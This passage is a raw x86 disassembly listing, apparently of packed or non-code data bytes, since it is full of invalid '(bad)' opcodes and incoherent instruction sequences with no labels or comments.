  403beb:	dc b7 79 c7 66 e3    	fdivl  -0x1c993887(%edi)
  403bf1:	03 c9                	add    %ecx,%ecx
  403bf3:	3c 38                	cmp    $0x38,%al
  403bf5:	44                   	inc    %esp
  403bf6:	6a 3e                	push   $0x3e
  403bf8:	37                   	aaa
  403bf9:	4f                   	dec    %edi
  403bfa:	e1 a6                	loope  0x403ba2
  403bfc:	d9 db                	(bad)
  403bfe:	c6                   	(bad)
  403bff:	37                   	aaa
  403c00:	0e                   	push   %cs
  403c01:	9b                   	fwait
  403c02:	f8                   	clc
  403c03:	19 a7 52 19 df 77    	sbb    %esp,0x77df1952(%edi)
  403c09:	0d 9e 46 e6 d1       	or     $0xd1e6469e,%eax
  403c0e:	bc e8 18 be 4d       	mov    $0x4dbe18e8,%esp
  403c13:	6e                   	outsb  %ds:(%esi),(%dx)
  403c14:	e1 bb                	loope  0x403bd1
  403c16:	3c 72                	cmp    $0x72,%al
  403c18:	8f                   	(bad)
  403c19:	e5 0f                	in     $0xf,%eax
  403c1b:	f2 e3 78             	repnz jecxz 0x403c96
  403c1e:	9d                   	popf
  403c1f:	d3 27                	shll   %cl,(%edi)
  403c21:	d6                   	salc
  403c22:	f1                   	int1
  403c23:	b6 73                	mov    $0x73,%dh
  403c25:	f1                   	int1
  403c26:	0c 91                	or     $0x91,%al
  403c28:	e2 09                	loop   0x403c33
  403c2a:	32 c5                	xor    %ch,%al
  403c2c:	13 84 70 a2 14 4e 14 	adc    0x144e14a2(%eax,%esi,2),%eax
  403c33:	c2 1e 29             	ret    $0x291e
  403c36:	ec                   	in     (%dx),%al
  403c37:	11 c2                	adc    %eax,%edx
  403c39:	a0 38 9e 24 0b       	mov    0xb249e38,%al
  403c3e:	4e                   	dec    %esi
  403c3f:	12 c2                	adc    %dl,%al
  403c41:	c9                   	leave
  403c42:	52                   	push   %edx
  403c43:	38 59 08             	cmp    %bl,0x8(%ecx)
  403c46:	01 71 1c             	add    %esi,0x1c(%ecx)
  403c49:	12 c7                	adc    %bh,%al
  403c4b:	53                   	push   %ebx
  403c4c:	c4                   	(bad)
  403c4d:	f1                   	int1
  403c4e:	54                   	push   %esp
  403c4f:	71 3c                	jno    0x403c8d
  403c51:	4d                   	dec    %ebp
  403c52:	1c 4f                	sbb    $0x4f,%al
  403c54:	17                   	pop    %ss
  403c55:	47                   	inc    %edi
  403c56:	19 d4                	sbb    %edx,%esp
  403c58:	2f                   	das
  403c59:	64 43                	fs inc %ebx
  403c5b:	64 f8                	fs clc
  403c5d:	44                   	inc    %esp
  403c5e:	5f                   	pop    %edi
  403c5f:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  403c60:	0e                   	push   %cs
  403c61:	9e                   	sahf
  403c62:	ad                   	lods   %ds:(%esi),%eax
  403c63:	ce                   	into
  403c64:	3f                   	aas
  403c65:	23 a3 f9 67 c6 43    	and    0x43c667f9(%ebx),%esp
  403c6b:	ce                   	into
  403c6c:	f3 13 0b             	repz adc (%ebx),%ecx
  403c6f:	71 79                	jno    0x403cea
  403c71:	fa                   	cli
  403c72:	46                   	inc    %esi
  403c73:	3c 1f                	cmp    $0x1f,%al
  403c75:	bf 52 ef 5f 5d       	mov    $0x5d5fef52,%edi
  403c7a:	65 bc a9 43 98 3a    	gs mov $0x3a9843a9,%esp
  403c80:	67 cf                	addr16 iret
  403c82:	94                   	xchg   %eax,%esp
  403c83:	57                   	push   %edi
  403c84:	38 53 5c             	cmp    %dl,0x5c(%ebx)
  403c87:	72 af                	jb     0x403c38
  403c89:	14 f6                	adc    $0xf6,%al
  403c8b:	0a e1                	or     %cl,%ah
  403c8d:	2c 29                	sub    $0x29,%al
  403c8f:	9c                   	pushf
  403c90:	25 84 b3 c5 f1       	and    $0xf1c5b384,%eax
  403c95:	1c 59                	sbb    $0x59,%al
  403c97:	70 8e                	jo     0x403c27
  403c99:	10 ce                	adc    %cl,%dh
  403c9b:	95                   	xchg   %eax,%ebp
  403c9c:	c2 b9 42             	ret    $0x42b9
  403c9f:	38 4f 0a             	cmp    %cl,0xa(%edi)
  403ca2:	e7 09                	out    %eax,$0x9
  403ca4:	e1 7c                	loope  0x403d22
  403ca6:	29 9c 2f 84 7d 52 d8 	sub    %ebx,-0x27ad827c(%edi,%ebp,1)
  403cad:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  403cae:	9f                   	lahf
  403caf:	c4 49 83             	les    -0x7d(%ecx),%ecx
  403cb2:	17                   	pop    %ss
  403cb3:	71 f7                	jno    0x403cac
  403cb5:	bc 09 2e c6 1e       	mov    $0x1ec62e09,%esp
  403cba:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  403cbb:	c6                   	(bad)
  403cbc:	1e                   	push   %ds
  403cbd:	c1 0f 86             	rorl   $0x86,(%edi)
  403cc0:	c1 4b 45 1b          	rorl   $0x1b,0x45(%ebx)
  403cc4:	fb                   	sti
  403cc5:	65 1b fb             	gs sbb %ebx,%edi
  403cc8:	85 70 81             	test   %esi,-0x7f(%eax)
  403ccb:	14 2e                	adc    $0x2e,%al
  403ccd:	10 c2                	adc    %al,%dl
  403ccf:	85 52 b8             	test   %edx,-0x48(%edx)
  403cd2:	50                   	push   %eax
  403cd3:	08 17                	or     %dl,(%edi)
  403cd5:	89 e3                	mov    %esp,%ebx
  403cd7:	c5 b2 e0 62 21 5c    	lds    0x5c2162e0(%edx),%esi
  403cdd:	22 85 4b 84 40 17    	and    0x1740844b(%ebp),%al
  403ce3:	d9 20                	fldenv (%eax)
  403ce5:	02 49 19             	add    0x19(%ecx),%cl
  403ce8:	bc 52 ed f8 d9       	mov    $0xd9f8ed52,%esp
  403ced:	4c                   	dec    %esp
  403cee:	b7 45                	mov    $0x45,%bh
  403cf0:	13 aa 29 3b 99 a9    	adc    -0x5666c4d7(%edx),%ebp
  403cf6:	cf                   	iret
  403cf7:	85 44 8a 2f          	test   %eax,0x2f(%edx,%ecx,4)
  403cfb:	7b ae                	jnp    0x403cab
  403cfd:	da e1                	(bad)
  403cff:	b3 45                	mov    $0x45,%bl
  403d01:	4f                   	dec    %edi
  403d02:	5f                   	pop    %edi
  403d03:	26 9b                	es fwait
  403d05:	be 4c 34 7d b9       	mov    $0xb97d344c,%esi
  403d0a:	14 2e                	adc    $0x2e,%al
  403d0c:	17                   	pop    %ss
  403d0d:	c2 15 52             	ret    $0x5215
  403d10:	b8 42 08 57 8a       	mov    $0x8a570842,%eax
  403d15:	e3 01                	jecxz  0x403d18
  403d17:	59                   	pop    %ecx
  403d18:	70 40                	jo     0x403d5a
  403d1a:	08 57 49             	or     %dl,0x49(%edi)
  403d1d:	e1 2a                	loope  0x403d49
  403d1f:	21 5c 2d 85          	and    %ebx,-0x7b(%ebp,%ebp,1)
  403d23:	ab                   	stos   %eax,%es:(%edi)
  403d24:	85 70 8d             	test   %esi,-0x73(%eax)
  403d27:	14 ae                	adc    $0xae,%al
  403d29:	d1 27                	shll   $1,(%edi)
  403d2b:	90                   	nop
  403d2c:	3c 78                	cmp    $0x78,%al
  403d2e:	9d                   	popf
  403d2f:	9a 40 31 0f ea bc 89 	lcall  $0x89bc,$0xea0f3140
  403d36:	aa                   	stos   %al,%es:(%edi)
  403d37:	31 7b 81             	xor    %edi,-0x7f(%ebx)
  403d3a:	da bf b9 6a fc 25    	fidivrl 0x25fc6ab9(%edi)
  403d40:	22 f0                	and    %al,%dh
  403d42:	61                   	popa
  403d43:	d9 d4                	(bad)
  403d45:	b0 68                	mov    $0x68,%al
  403d47:	7b 44                	jnp    0x403d8d
  403d49:	0a 23                	or     (%ebx),%ah
  403d4b:	42                   	inc    %edx
  403d4c:	b8 56 0a d7 0a       	mov    $0xad70a56,%eax
  403d51:	e1 3a                	loope  0x403d8d
  403d53:	71 bc                	jno    0x403d11
  403d55:	5e                   	pop    %esi
  403d56:	16                   	push   %ss
  403d57:	5c                   	pop    %esp
  403d58:	2f                   	das
  403d59:	84 1b                	test   %bl,(%ebx)
  403d5b:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  403d5c:	70 83                	jo     0x403ce1
  403d5e:	10 7e 29             	adc    %bh,0x29(%esi)
  403d61:	85 5f 0a             	test   %ebx,0xa(%edi)
  403d64:	e1 46                	loope  0x403dac
  403d66:	29 dc                	sub    %ebx,%esp
  403d68:	a8 9f                	test   $0x9f,%al
  403d6a:	11 89 83 37 eb 67    	adc    %ecx,0x67eb3783(%ecx)
  403d70:	84 ea                	test   %ch,%dl
  403d72:	62                   	(bad)
  403d73:	c4 ab d4 88 57 a8    	les    -0x57a8772c(%ebx),%ebp
  403d79:	11 af 15 11 ff 4a    	adc    %ebp,0x4aff1115(%edi)
  403d7f:	b6 f1                	mov    $0xf1,%dh
  403d81:	2b d1                	sub    %ecx,%edx
  403d83:	e8 4d 52 b8 49       	call   0x49f88fd5
  403d88:	08 07                	or     %al,(%edi)
  403d8a:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  403d8b:	70 50                	jo     0x403ddd
  403d8d:	08 37                	or     %dh,(%edi)
  403d8f:	8b e3                	mov    %ebx,%esp
  403d91:	2d b2 e0 16 21       	sub    $0x2116e0b2,%eax
  403d96:	dc 2a                	fsubrl (%edx)
  403d98:	85 5b 85             	test   %ebx,-0x7b(%ebx)
  403d9b:	f0 6b 29 90          	lock imul $0xffffff90,(%ecx),%ebp
  403d9f:	11 dc                	adc    %ebx,%esp
  403da1:	78 44                	js     0x403de7
  403da3:	0d de c9 fd 0b       	or     $0xbfdc9de,%eax
  403da8:	26 fa                	es cli
  403daa:	18 62 9d             	sbb    %ah,-0x63(%edx)
  403dad:	1a 62 8d             	sbb    -0x73(%edx),%ah
  403db0:	1a e2                	sbb    %dl,%ah
  403db2:	46                   	inc    %esi
  403db3:	1e                   	push   %ds
  403db4:	62                   	(bad)
  403db5:	f0 49                	lock dec %ecx
  403db7:	32 43 ad             	xor    -0x53(%ebx),%al
  403dba:	64 50                	fs push %eax
  403dbc:	2b 19                	sub    (%ecx),%ebx
  403dbe:	a9 12 bf c6 6d       	test   $0x6dc6bf12,%eax
  403dc3:	f2 1a b7 89 8b de 2e 	repnz sbb 0x2ede8b89(%edi),%dh
  403dca:	85 db                	test   %ebx,%ebx
  403dcc:	85 70 87             	test   %esi,-0x79(%eax)
  403dcf:	14 ee                	adc    $0xee,%al
  403dd1:	10 c2                	adc    %al,%dl
  403dd3:	9d                   	popf
  403dd4:	e2 78                	loop   0x403e4e
  403dd6:	97                   	xchg   %eax,%edi
  403dd7:	2c b8                	sub    $0xb8,%al
  403dd9:	4b                   	dec    %ebx
  403dda:	08 77 4b             	or     %dh,0x4b(%edi)
  403ddd:	e1 6e                	loope  0x403e4d
  403ddf:	21 dc                	and    %ebx,%esp
  403de1:	23 85 7b f4 53 c3    	and    -0x3cac0b85(%ebp),%eax
  403de7:	30 f8                	xor    %bh,%al
  403de9:	80 1a af             	sbbb   $0xaf,(%edx)
  403dec:	5b                   	pop    %ebx
  403ded:	c4 70 af             	les    -0x51(%eax),%esi
  403df0:	ac                   	lods   %ds:(%esi),%al
  403df1:	76 af                	jbe    0x403da2
  403df3:	38 ef                	cmp    %ch,%bh
  403df5:	3e 29 dc             	ds sub %ebx,%esp
  403df8:	27                   	daa
  403df9:	84 fb                	test   %bh,%bl
  403dfb:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  403dfc:	70 bf                	jo     0x403dbd
  403dfe:	10 1e                	adc    %bl,(%esi)
  403e00:	10 c7                	adc    %al,%bh
  403e02:	07                   	pop    %es
  403e03:	65 c1 83 42 78 48 0a 	roll   $0xf,%gs:0xa487842(%ebx)
  403e0a:	0f 
  403e0b:	09 e1                	or     %esp,%ecx
  403e0d:	61                   	popa
  403e0e:	29 3c 2c             	sub    %edi,(%esp,%ebp,1)
  403e11:	84 df                	test   %bl,%bh
  403e13:	48                   	dec    %eax
  403e14:	e1 37                	loope  0x403e4d
  403e16:	fa                   	cli
  403e17:	61                   	popa
  403e18:	37                   	aaa
  403e19:	0c 8e                	or     $0x8e,%al
  403e1b:	89 f2                	mov    %esi,%edx
  403e1d:	47                   	inc    %edi
  403e1e:	64 f9                	fs stc
  403e20:	23 42 78             	and    0x78(%edx),%eax
  403e23:	54                   	push   %esp
  403e24:	0a 8f 0a 61 54 0a    	or     0xa54610a(%edi),%cl
  403e2a:	a3 42 90 a7 fe       	mov    %eax,0xfea79042
  403e2f:	56                   	push   %esi
  403e30:	16                   	push   %ss
  403e31:	fc                   	cld
  403e32:	56                   	push   %esi
  403e33:	08 8f 49 e1 31 fd    	or     %cl,-0x2ce1eb7(%edi)
  403e39:	b5 12                	mov    $0x12,%ch
  403e3b:	06                   	push   %es
  403e3c:	bf d3 4f 31 d5       	mov    $0xd5314fd3,%edi
  403e41:	c5 fe d8             	(bad)
  403e44:	ad                   	lods   %ds:(%esi),%eax
  403e45:	8e df                	mov    %edi,%ds
  403e47:	4e                   	dec    %esi
  403e48:	75 fc                	jne    0x403e46
  403e4a:	4e                   	dec    %esi
  403e4b:	11 bd f3 b5 6c e3    	adc    %edi,-0x1c934a0d(%ebp)
  403e51:	6b d1 e8             	imul   $0xffffffe8,%ecx,%edx
  403e54:	37                   	aaa
  403e55:	52                   	push   %edx
  403e56:	f8                   	clc
  403e57:	46                   	inc    %esi
  403e58:	08 df                	or     %bl,%bh
  403e5a:	4a                   	dec    %edx
  403e5b:	e1 5b                	loope  0x403eb8
  403e5d:	21 7c 27 8e          	and    %edi,-0x72(%edi,%eiz,1)
  403e61:	df cb                	(bad)
  403e63:	82 ef 85             	sub    $0x85,%bh
  403e66:	70 44                	jo     0x403eac
  403e68:	0a 47 84             	or     -0x7c(%edi),%al
  403e6b:	00 4c 08 64          	add    %cl,0x64(%eax,%ecx,1)
  403e6f:	68 9d 61 64 6a       	push   $0x6a64619d
  403e74:	39 93 e5 4c 08 8a    	cmp    %edx,-0x75f7b31b(%ebx)
  403e7a:	14 14                	adc    $0x14,%al
  403e7c:	21 18                	and    %ebx,(%eax)
  403e7e:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  403e7f:	60                   	pusha
  403e80:	10 82 3c d5 24 0b    	adc    %al,0xb24d53c(%edx)
  403e86:	4c                   	dec    %esp
  403e87:	42                   	inc    %edx
  403e88:	30 4b 81             	xor    %cl,-0x7f(%ebx)
  403e8b:	8c e0                	mov    %fs,%eax
  403e8d:	f4                   	hlt
  403e8e:	cd 18                	int    $0x18
  403e90:	0c 63                	or     $0x63,%al
  403e92:	34 33                	xor    $0x33,%al
  403e94:	af                   	scas   %es:(%edi),%eax
  403e95:	56                   	push   %esi
  403e96:	67 e6 01             	addr16 out %al,$0x1
  403e99:	b5 17                	mov    $0x17,%ch
  403e9b:	86 45 fa             	xchg   %al,-0x6(%ebp)
  403e9e:	16                   	push   %ss
  403e9f:	79 96                	jns    0x403e37
  403ea1:	45                   	inc    %ebp
  403ea2:	34 13                	xor    $0x13,%al
  403ea4:	22 85 10 21 84 4a    	and    0x4a842110(%ebp),%al
  403eaa:	21 54 08 61          	and    %edx,0x61(%eax,%ecx,1)
  403eae:	e2 18                	loop   0x403ec8
  403eb0:	2e 0b c2             	cs or  %edx,%eax
  403eb3:	85 10                	test   %edx,(%eax)
  403eb5:	21 85 08 21 44 4a    	and    %eax,0x4a442108(%ebp)
  403ebb:	21 52 08             	and    %edx,0x8(%edx)
  403ebe:	51                   	push   %ecx
  403ebf:	52                   	push   %edx
  403ec0:	88 12                	mov    %dl,(%edx)
  403ec2:	c2 0c 29             	ret    $0x290c
  403ec5:	cc                   	int3
  403ec6:	98                   	cwtl
  403ec7:	10 74 f8 a0          	adc    %dh,-0x60(%eax,%edi,8)
  403ecb:	4d                   	dec    %ebp
  403ecc:	0d fa 2e 35 e8       	or     $0xe8352efa,%eax
  403ed1:	3b d4                	cmp    %esp,%edx
  403ed3:	a0 6f 63 fa 4d       	mov    0x4dfa636f,%al
  403ed8:	be a8 84 0f c6       	mov    $0xc60f84a8,%esi
  403edd:	5f                   	pop    %edi
  403ede:	32 75 93             	xor    -0x6d(%ebp),%dh
  403ee1:	7f bd                	jg     0x403ea0
  403ee3:	3a b4 f7 a8 27 dd a5 	cmp    -0x5a22d858(%edi,%esi,8),%dh
  403eea:	9e                   	sahf
  403eeb:	74 87                	je     0x403e74
  403eed:	58                   	pop    %eax
  403eee:	cc                   	int3
  403eef:	6f                   	outsl  %ds:(%esi),(%dx)
  403ef0:	13 19                	adc    (%ecx),%ebx
  403ef2:	47                   	inc    %edi
  403ef3:	cb                   	lret
  403ef4:	4b                   	dec    %ebx
  403ef5:	46                   	inc    %esi
  403ef6:	8b 18                	mov    (%eax),%ebx
  403ef8:	ac                   	lods   %ds:(%esi),%al
  403ef9:	52                   	push   %edx
  403efa:	b0 0a                	mov    $0xa,%al
  403efc:	21 46 0a             	and    %eax,0xa(%esi)
  403eff:	31 42 b0             	xor    %eax,-0x50(%edx)
  403f02:	89 e3                	mov    %esp,%ebx
  403f04:	4c                   	dec    %esp
  403f05:	59                   	pop    %ecx
  403f06:	30 53 08             	xor    %dl,0x8(%ebx)
  403f09:	b1 52                	mov    $0x52,%cl
  403f0b:	88 15 42 9c 14 e2    	mov    %dl,0xe2149c42
  403f11:	84 60 97             	test   %ah,-0x69(%eax)
  403f14:	82 5d 08 f1          	sbbb   $0xf1,0x8(%ebp)
  403f18:	52                   	push   %edx
  403f19:	88 17                	mov    %dl,(%edi)
  403f1b:	42                   	inc    %edx
  403f1c:	82 14 12 84          	adcb   $0x84,(%edx,%edx,1)
  403f20:	90                   	nop
  403f21:	28 85 44 21 24 49    	sub    %al,0x49242144(%ebp)
  403f27:	21 49 08             	and    %ecx,0x8(%ecx)
  403f2a:	c9                   	leave
  403f2b:	52                   	push   %edx
  403f2c:	48                   	dec    %eax
  403f2d:	16                   	push   %ss
  403f2e:	42                   	inc    %edx
  403f2f:	8a 14 52             	mov    (%edx,%edx,2),%dl
  403f32:	84 90 2a 85 54 21    	test   %dl,0x2154852a(%eax)
  403f38:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  403f39:	49                   	dec    %ecx
  403f3a:	21 4d 15             	and    %ecx,0x15(%ebp)
  403f3d:	d4 8f                	aam    $0x8f
  403f3f:	63 82 8b 5e d8 60    	arpl   %eax,0x60d85e8b(%edx)
  403f45:	d6                   	salc
  403f46:	84 01                	test   %al,(%ecx)
  403f48:	50                   	push   %eax
  403f49:	7d ec                	jge    0x403f37
  403f4b:	c4 a7 d5 4e 7c 52    	les    0x527c4ed5(%edi),%esp
  403f51:	ed                   	in     (%dx),%eax
  403f52:	d9 17                	fsts   (%edi)
  403f54:	45                   	inc    %ebp
  403f55:	1f                   	pop    %ds
  403f56:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  403f57:	cb                   	lret
  403f58:	d6                   	salc
  403f59:	d2 45 f3             	rolb   %cl,-0xd(%ebp)
  403f5c:	19 52 c8             	sbb    %edx,-0x38(%edx)
  403f5f:	10 42 a6             	adc    %al,-0x5a(%edx)
  403f62:	14 32                	adc    $0x32,%al
  403f64:	85 90 25 8e b3 64    	test   %edx,0x64b38e25(%eax)
  403f6a:	c1 2c 21 cc          	shrl   $0xcc,(%ecx,%eiz,1)
  403f6e:	96                   	xchg   %eax,%esi
  403f6f:	c2 6c 21             	ret    $0x216c
  403f72:	cc                   	int3
  403f73:	91                   	xchg   %eax,%ecx
  403f74:	02 19                	add    (%ecx),%bl
  403f76:	c1 10 67             	rcll   $0x67,(%eax)
  403f79:	0d e6 4c 08 51       	or     $0x51084ce6,%eax
  403f7e:	f5                   	cmc
  403f7f:	31 c4                	xor    %eax,%esp
  403f81:	57                   	push   %edi
  403f82:	d4 10                	aam    $0x10
  403f84:	5f                   	pop    %edi
  403f85:	56                   	push   %esi
  403f86:	43                   	inc    %ebx
  403f87:	1c 17                	sbb    $0x17,%al
  403f89:	21 ce                	and    %ecx,%esi
  403f8b:	95                   	xchg   %eax,%ebp
  403f8c:	ad                   	lods   %ds:(%esi),%eax
  403f8d:	cc                   	int3
  403f8e:	15 cd 66 4b 21       	adc    $0x214b66cd,%eax
  403f93:	5b                   	pop    %ebx
  403f94:	08 f3                	or     %dh,%bl
  403f96:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  403f97:	30 4f 08             	xor    %cl,0x8(%edi)
  403f9a:	39 e2                	cmp    %esp,%edx
  403f9c:	98                   	cwtl
  403f9d:	2b 0b                	sub    (%ebx),%ecx
  403f9f:	72 85                	jb     0x403f26
  403fa1:	30 5f 0a             	xor    %bl,0xa(%edi)
  403fa4:	f3 85 b0 40 0a 0b 26 	repz test %esi,0x260b0a40(%eax)
  403fab:	de d7                	(bad)
  403fad:	05 dc f5 4d 70       	add    $0x704df5dc,%eax
  403fb2:	31 c0                	xor    %eax,%eax
  403fb4:	f7 d4                	not    %esp
  403fb6:	00 df                	add    %bl,%bh
  403fb8:	11 91 e5 c9 93 f3    	adc    %edx,-0xc6c361b(%ecx)
  403fbe:	44                   	inc    %esp
  403fbf:	6b 0b a5             	imul   $0xffffffa5,(%ebx),%ecx
  403fc2:	b0 50                	mov    $0x50,%al
  403fc4:	08 f9                	or     %bh,%cl
  403fc6:	52                   	push   %edx
  403fc7:	c8 17 42 81          	enter  $0x4217,$0x81
  403fcb:	38 16                	cmp    %dl,(%esi)
  403fcd:	ca 82 42             	lret   $0x4282
  403fd0:	21 14 49             	and    %edx,(%ecx,%ecx,2)
  403fd3:	a1 48 08 8b a4       	mov    0xa48b0848,%eax
  403fd8:	b0 48                	mov    $0x48,%al
  403fda:	08 8b a5 b0 58 08    	or     %cl,0x858b0a5(%ebx)
  403fe0:	c5 52 28             	lds    0x28(%edx),%edx
  403fe3:	16                   	push   %ss
  403fe4:	c2 12 29             	ret    $0x2912
  403fe7:	2c 11                	sub    $0x11,%al
  403fe9:	42                   	inc    %edx
  403fea:	89 14 4a             	mov    %edx,(%edx,%ecx,2)
  403fed:	84 b0 54 0a 4b 27    	test   %dh,0x274b0a54(%eax)
  403ff3:	8c 40 e4             	mov    %es,-0x1c(%eax)
  403ff6:	e0 4a                	loopne 0x404042
  403ff8:	f5                   	cmc
  403ff9:	2e 8d 50 e8          	lea    %cs:-0x18(%eax),%edx
  403ffd:	86 0b                	xchg   %cl,(%ebx)
  403fff:	53                   	push   %ebx
  404000:	d4 1d                	aam    $0x1d
  404002:	a9 a2 bf 4b 45       	test   $0x454bbfa2,%eax
  404007:	25 bc 4b 8f 88       	and    $0x888f4bbc,%eax
  40400c:	bb f4 3b 75 a0       	mov    $0xa0753bf4,%ebx
  404011:	a2 d4 93 22 d4       	mov    %al,0xd42293d4
  404016:	93                   	xchg   %eax,%ebx
  404017:	e8 5c bc 4b e9       	call   0xe98bfc78
  40401c:	64 bc e4 32 79 c9    	fs mov $0xc97932e4,%esp
  404022:	65 22 86 e5 52 58 2e 	and    %gs:0x2e5852e5(%esi),%al
  404029:	84 15 52 58 21 84    	test   %dl,0x84215852
  40402f:	95                   	xchg   %eax,%ebp
  404030:	e2 b8                	loop   0x403fea
  404032:	4a                   	dec    %edx
  404033:	16                   	push   %ss
  404034:	ac                   	lods   %ds:(%esi),%al
  404035:	12 c2                	adc    %dl,%al
  404037:	6a 29                	push   $0x29
  404039:	ac                   	lods   %ds:(%esi),%al
  40403a:	16                   	push   %ss
  40403b:	42                   	inc    %edx
  40403c:	a9 14 4a 85 e0       	test   $0xe0854a14,%eax
  404041:	90                   	nop
  404042:	82 43 08 6b          	addb   $0x6b,0x8(%ebx)
  404046:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  404047:	b0 46                	mov    $0x46,%al
  404049:	08 65 52             	or     %ah,0x52(%ebp)
  40404c:	20 23                	and    %ah,(%ebx)
  40404e:	f8                   	clc
  40404f:	e6 1d                	out    %al,$0x1d
  404051:	3a b8 56 ed 82 64    	cmp    0x6482ed56(%eax),%bh
  404057:	11 77 b9             	adc    %esi,-0x47(%edi)
  40405a:	ac                   	lods   %ds:(%esi),%al
  40405b:	57                   	push   %edi
  40405c:	2e 4e                	cs dec %esi
  40405e:	ac                   	lods   %ds:(%esi),%al
  40405f:	90                   	nop
  404060:	42                   	inc    %edx
  404061:	85 10                	test   %edx,(%eax)
  404063:	2a a5 50 29 84 b5    	sub    -0x4a7bd6b0(%ebp),%ah
  404069:	e2 58                	loop   0x4040c3
  40406b:	25 0b aa 84 50       	and    $0x5084aa0b,%eax
  404070:	2d 85 6a 21 1c       	sub    $0x1c216a85,%eax
  404075:	25 85 a3 26 8c       	and    $0x8c26a385,%eax
  40407a:	43                   	inc    %ebx
  40407b:	c4 60 9d             	les    -0x63(%eax),%esp
  40407e:	1a c4                	sbb    %ah,%al
  404080:	42                   	inc    %edx
  404081:	b5 4b                	mov    $0x4b,%ch
  404083:	17                   	pop    %ss
  404084:	a8 5d                	test   $0x5d,%al
  404086:	9a 3b 61 1c 44 25 1c 	lcall  $0x1c25,$0x441c613b
  40408d:	87 4c 45 1d          	xchg   %ecx,0x1d(%ebp,%eax,2)
  404091:	87 74 85 c6          	xchg   %esi,-0x3a(%ebp,%eax,4)
  404095:	a1 40 3d 69 a1       	mov    0xa1693d40,%eax
  40409a:	7a d2                	jp     0x40406e
  40409c:	02 31                	add    (%ecx),%dh
  40409e:	0e                   	push   %cs
  40409f:	b9 22 9f 75 f2       	mov    $0xf2759f22,%ecx
  4040a4:	92                   	xchg   %eax,%edx
  4040a5:	eb 44                	jmp    0x4040eb
  4040a7:	0c 35                	or     $0x35,%al
  4040a9:	52                   	push   %edx
  4040aa:	a8 11                	test   $0x11,%al
  4040ac:	42                   	inc    %edx
  4040ad:	ad                   	lods   %ds:(%esi),%eax
  4040ae:	14 6a                	adc    $0x6a,%al
  4040b0:	85 50 27             	test   %edx,0x27(%eax)
  4040b3:	8e f5                	mov    %ebp,%?
  4040b5:	b2 a0                	mov    $0xa0,%dl
  4040b7:	5e                   	pop    %esi
  4040b8:	08 0d 52 68 10 c2    	or     %cl,0xc2106852
  4040be:	7a 29                	jp     0x4040e9
  4040c0:	ac                   	lods   %ds:(%esi),%al
  4040c1:	17                   	pop    %ss
  4040c2:	42                   	inc    %edx
  4040c3:	a3 14 1a 85 d0       	mov    %eax,0xd0851a14
  4040c8:	24 85                	and    $0x85,%al
  4040ca:	26 21 34 4b          	and    %esi,%es:(%ebx,%ecx,2)
  4040ce:	81 8c 62 25 6e 7f 7c 	orl    $0x929e7c7b,0x7c7f6e25(%edx,%eiz,2)
  4040d5:	7b 7c 9e 92 
  4040d9:	90                   	nop
  4040da:	93                   	xchg   %eax,%ebx
  4040db:	16                   	push   %ss
  4040dc:	9a 73 85 92 5d 88 61 	lcall  $0x6188,$0x5d928573
  4040e3:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  4040e4:	85 16                	test   %edx,(%esi)
  4040e6:	c5 2b                	lds    (%ebx),%ebp
  4040e8:	49                   	dec    %ecx
  4040e9:	fb                   	sti
  4040ea:	95                   	xchg   %eax,%ebp
  4040eb:	e4 fd                	in     $0xfd,%al
  4040ed:	a9 9b 9d 4a ca       	test   $0xca4a9d9b,%eax
  4040f2:	fe                   	(bad)
  4040f3:	b4 68                	mov    $0x68,%ah
  4040f5:	3c a4                	cmp    $0xa4,%al
  4040f7:	ee                   	out    %al,(%dx)
  4040f8:	4f                   	dec    %edi
  4040f9:	8b df                	mov    %edi,%ebx
  4040fb:	ec                   	in     (%dx),%al
  4040fc:	cc                   	int3
  4040fd:	51                   	push   %ecx
  4040fe:	e2 f7                	loop   0x4040f7
  404100:	4f                   	dec    %edi
  404101:	a8 66                	test   $0x66,%al
  404103:	df 8f 0a af 96 a0    	fisttps -0x5f6950f6(%edi)
  404109:	56                   	push   %esi
  40410a:	4b                   	dec    %ebx
  40410b:	14 d5                	adc    $0xd5,%al
  40410d:	ec                   	in     (%dx),%al
  40410e:	fb                   	sti
  40410f:	73 f8                	jae    0x404109
  404111:	bb 71 8d f8 7d       	mov    $0x7df88d71,%ebx
  404116:	81 12 17 6f 5c 60    	adcl   $0x605c6f17,(%edx)
  40411c:	88 cb                	mov    %cl,%bl
  40411e:	65 76 e7             	gs jbe 0x404108
  404121:	4b                   	dec    %ebx
  404122:	07                   	pop    %es
  404123:	94                   	xchg   %eax,%esp
  404124:	b8 f3 f9 af a3       	mov    $0xa3aff9f3,%eax
  404129:	66 af                	scas   %es:(%edi),%ax
  40412b:	35 c4 6f 7e c9       	xor    $0xc97e6fc4,%eax
  404130:	f9                   	stc
  404131:	52                   	push   %edx
  404132:	63 d0                	arpl   %edx,%eax
  404134:	4f                   	dec    %edi
  404135:	2b d5                	sub    %ebp,%edx
  404137:	7b 71                	jnp    0x4041aa
  404139:	dc b1 47 19 13 b3    	fdivl  -0x4cece6b9(%ecx)
  40413f:	97                   	xchg   %eax,%edi
  404140:	f0 3e 4d             	lock ds dec %ebp
  404143:	32 a9 46 0e ff 1d    	xor    0x1dff0e46(%ecx),%ch
  404149:	d9 27                	fldenv (%edi)
  40414b:	26 fa                	es cli
  40414d:	7d a8                	jge    0x4040f7
  40414f:	35 2e 2c 2d 32       	xor    $0x322d2c2e,%eax
  404154:	3c 1d                	cmp    $0x1d,%al
  404156:	2f                   	das
  404157:	10 88 48 0b 8d 54    	adc    %cl,0x548d0b48(%eax)
  40415d:	ce                   	into
  40415e:	f3 a4                	rep movsb %ds:(%esi),%es:(%edi)
  404160:	ef                   	out    %eax,(%dx)
  404161:	63 00                	arpl   %eax,(%eax)
  404163:	ea af e0 6c 46 fa 25 	ljmp   $0x25fa,$0x466ce0af
  40416a:	e0 b9                	loopne 0x404125
  40416c:	fc                   	cld
  40416d:	b7 12                	mov    $0x12,%bh
  40416f:	36 b3 6a             	ss mov $0x6a,%bl
